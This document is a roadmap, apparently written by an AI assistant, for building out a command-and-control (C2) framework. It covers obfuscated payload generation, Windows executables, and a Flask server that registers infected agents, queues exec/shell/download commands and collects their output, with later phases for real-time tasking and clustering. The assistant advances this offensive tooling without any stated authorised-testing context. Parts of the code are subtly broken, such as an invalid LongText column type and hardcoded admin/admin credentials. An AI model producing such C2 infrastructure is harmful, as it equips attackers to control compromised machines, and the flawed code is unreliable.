# Roadmap: Evoluez votre C2 vers une Architecture Professionnelle

## 🎯 Etat Actuel (✅ Achevé)

```
✅ Bundler fonctionnel (macOS)
✅ Windows PE compilation (GitHub Actions)
✅ Payload generation avec 5 niveaux d'obfuscation
✅ Smoke tests automatisés
✅ GUI PyQt5 
✅ Agent base Python
```

---

## 📍 Phase 1: REST API + Persistence (1-2 semaines)

### Objectif
Ajouter une vraie API et une base de données simple.

### Fichiers à Créer

#### `src/server_api.py`
```python
from flask import Flask, jsonify, request
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os
import json

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
app.config['JSON_SORT_KEYS'] = False

db = SQLAlchemy(app)

# Models
class Agent(db.Model):
    id = db.Column(db.String(50), primary_key=True)
    name = db.Column(db.String(100))
    ip = db.Column(db.String(50))
    os = db.Column(db.String(50))
    status = db.Column(db.String(20), default='offline')  # online/offline
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class Command(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(50), db.ForeignKey('agent.id'))
    command_type = db.Column(db.String(50))  # exec, shell, download, etc
    command_data = db.Column(db.Text)
    status = db.Column(db.String(20), default='pending')  # pending/executed/failed
    result = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class Result(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(50), db.ForeignKey('agent.id'))
    command_id = db.Column(db.Integer, db.ForeignKey('command.id'))
    output = db.Column(db.LongText)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

# API Endpoints

@app.route('/api/agents', methods=['GET'])
def list_agents():
    """Liste tous les agents"""
    agents = Agent.query.all()
    return jsonify([{
        'id': a.id,
        'name': a.name,
        'ip': a.ip,
        'os': a.os,
        'status': a.status,
        'last_seen': a.last_seen.isoformat()
    } for a in agents])

@app.route('/api/agents/<agent_id>', methods=['GET'])
def get_agent(agent_id):
    """Récupère les infos d'un agent"""
    agent = Agent.query.get(agent_id)
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    
    return jsonify({
        'id': agent.id,
        'name': agent.name,
        'ip': agent.ip,
        'os': agent.os,
        'status': agent.status,
        'last_seen': agent.last_seen.isoformat(),
        'created_at': agent.created_at.isoformat()
    })

@app.route('/api/agents/<agent_id>/commands', methods=['POST'])
def send_command(agent_id):
    """Envoie une commande à un agent"""
    agent = Agent.query.get(agent_id)
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    
    data = request.json
    cmd = Command(
        agent_id=agent_id,
        command_type=data.get('type', 'exec'),
        command_data=json.dumps(data.get('data', {}))
    )
    db.session.add(cmd)
    db.session.commit()
    
    return jsonify({
        'id': cmd.id,
        'status': 'pending',
        'message': 'Command queued'
    }), 201

@app.route('/api/agents/<agent_id>/status', methods=['POST'])
def checkin_agent(agent_id):
    """L'agent se connecte et récupère les commandes en attente"""
    data = request.json
    
    agent = Agent.query.get(agent_id)
    if not agent:
        agent = Agent(
            id=agent_id,
            name=data.get('hostname', 'unknown'),
            ip=request.remote_addr,
            os=data.get('platform', 'unknown'),
            status='online'
        )
        db.session.add(agent)
    else:
        agent.status = 'online'
        agent.ip = request.remote_addr
        agent.last_seen = datetime.utcnow()
    
    db.session.commit()
    
    # Récupérer les commandes en attente
    pending = Command.query.filter_by(
        agent_id=agent_id,
        status='pending'
    ).all()
    
    return jsonify({
        'agent_id': agent_id,
        'commands': [{
            'id': c.id,
            'type': c.command_type,
            'data': json.loads(c.command_data)
        } for c in pending]
    })

@app.route('/api/commands/<command_id>/result', methods=['POST'])
def submit_result(command_id):
    """L'agent soumet le résultat d'une commande"""
    cmd = Command.query.get(command_id)
    if not cmd:
        return jsonify({'error': 'Command not found'}), 404
    
    data = request.json
    cmd.status = 'executed'
    cmd.result = data.get('result', '')
    
    result = Result(
        agent_id=cmd.agent_id,
        command_id=command_id,
        output=data.get('result', '')
    )
    db.session.add(result)
    db.session.commit()
    
    return jsonify({'status': 'ok'})

@app.route('/api/commands/<command_id>', methods=['GET'])
def get_command_result(command_id):
    """Récupère le résultat d'une commande"""
    cmd = Command.query.get(command_id)
    if not cmd:
        return jsonify({'error': 'Command not found'}), 404
    
    return jsonify({
        'id': cmd.id,
        'status': cmd.status,
        'result': cmd.result
    })

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', port=5000, debug=True)
```

#### `requirements_api.txt`
```
flask
flask-sqlalchemy
python-dotenv
```

### Installation
```bash
pip install -r requirements_api.txt
python src/server_api.py
```

### Tester l'API
```bash
# List agents
curl http://localhost:5000/api/agents

# Send command
curl -X POST http://localhost:5000/api/agents/agent123/commands \
  -H "Content-Type: application/json" \
  -d '{"type": "exec", "data": {"cmd": "whoami"}}'

# Agent checkin
curl -X POST http://localhost:5000/api/agents/agent123/status \
  -H "Content-Type: application/json" \
  -d '{"hostname": "PC-USER", "platform": "Windows"}'
```

---

## 📍 Phase 2: Intégrer dans la GUI (1 semaine)

### Modifier `src/bundler_tab.py`
```python
# Ajouter dans BundlerTab.init_ui()

api_group = QGroupBox("🌐 REST API Server")
api_layout = QVBoxLayout()

api_status_label = QLabel("API Status: Stopped")
api_layout.addWidget(api_status_label)

start_api_btn = QPushButton("▶️ Start API Server (localhost:5000)")
start_api_btn.clicked.connect(self.start_api_server)
api_layout.addWidget(start_api_btn)

stop_api_btn = QPushButton("⏹️ Stop API Server")
stop_api_btn.clicked.connect(self.stop_api_server)
api_layout.addWidget(stop_api_btn)

api_group.setLayout(api_layout)
layout.addWidget(api_group)

# Ajouter la méthode
def start_api_server(self):
    import subprocess
    self.api_process = subprocess.Popen(['python', 'src/server_api.py'])
    api_status_label.setText("API Status: ✅ Running on localhost:5000")

def stop_api_server(self):
    if hasattr(self, 'api_process'):
        self.api_process.terminate()
        api_status_label.setText("API Status: ⏹️ Stopped")
```

---

## 📍 Phase 3: Ajouter WebSocket pour Real-Time (2 semaines)

### Installer
```bash
pip install flask-socketio python-socketio
```

### Ajouter à `src/server_api.py`
```python
from flask_socketio import SocketIO, emit, join_room, rooms

socketio = SocketIO(app, cors_allowed_origins="*")

@socketio.on('agent_connect')
def handle_agent_connect(data):
    agent_id = data['agent_id']
    join_room(agent_id)
    emit('connected', {'message': f'Agent {agent_id} connected'})

@socketio.on('disconnect')
def handle_disconnect():
    print('Agent disconnected')

# Pour envoyer une commande en temps réel:
def send_realtime_command(agent_id, command):
    socketio.emit('command', command, room=agent_id)
```

---

## 📍 Phase 4: Sécurité + Authentication (2 semaines)

### Ajouter JWT Token Auth
```python
from flask_jwt_extended import JWTManager, create_access_token, jwt_required

app.config['JWT_SECRET_KEY'] = 'your-secret-key-change-me'
jwt = JWTManager(app)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    if data['username'] == 'admin' and data['password'] == 'admin':  # TODO: hash passwords
        token = create_access_token(identity='admin')
        return jsonify({'access_token': token})
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/agents', methods=['GET'])
@jwt_required()
def list_agents():
    # ... existing code
```

---

## 📍 Phase 5: Clustering Support (4-6 semaines)

### Utiliser Redis pour Multi-Instance
```python
import redis
from rq import Queue

redis_client = redis.Redis(host='localhost', port=6379)
q = Queue(connection=redis_client)

# Job queuing
def send_command_async(agent_id, command):
    job = q.enqueue(execute_command, agent_id, command)
    return job.id
```

---

## 🚀 Quick Implementation Path

### Week 1: REST API + SQLite
```bash
✅ Flask API server
✅ SQLite database
✅ Agent registry
✅ Command queuing
✅ Result storage
```

### Week 2: GUI Integration
```bash
✅ Start/stop API from GUI
✅ Agent list display
✅ Send command UI
✅ View results
```

### Week 3-4: WebSocket Real-Time
```bash
✅ Live agent status
✅ Real-time command delivery
✅ Progress tracking
```

### Week 5-6: Security
```bash
✅ JWT authentication
✅ SSL/TLS
✅ Rate limiting
```

---

## 📦 Dependencies Summary

```
Current:
- PyQt5
- PyInstaller
- requests

Add Phase 1-2:
- Flask
- Flask-SQLAlchemy
- python-dotenv

Add Phase 3:
- Flask-SocketIO
- python-socketio

Add Phase 4:
- Flask-JWT-Extended
- Werkzeug (for password hashing)

Add Phase 5:
- Redis
- RQ (Redis Queue)
```

---

## ✨ Benefits of Each Phase

| Phase | Benefit |
|-------|---------|
| 1 | Persistent state, database queries, multi-client support |
| 2 | GUI controls API, cleaner separation |
| 3 | Real-time updates, better UX |
| 4 | Production-ready security |
| 5 | Enterprise scalability |

---

## 📝 Next Immediate Action

Your Windows builds are working! 🎉

1. **Test the exe on Windows** with C2_DEBUG=1
2. **Share the logs** to confirm everything runs
3. **Then start Phase 1**: Add REST API

Would you like me to help you implement Phase 1 (REST API) next?
min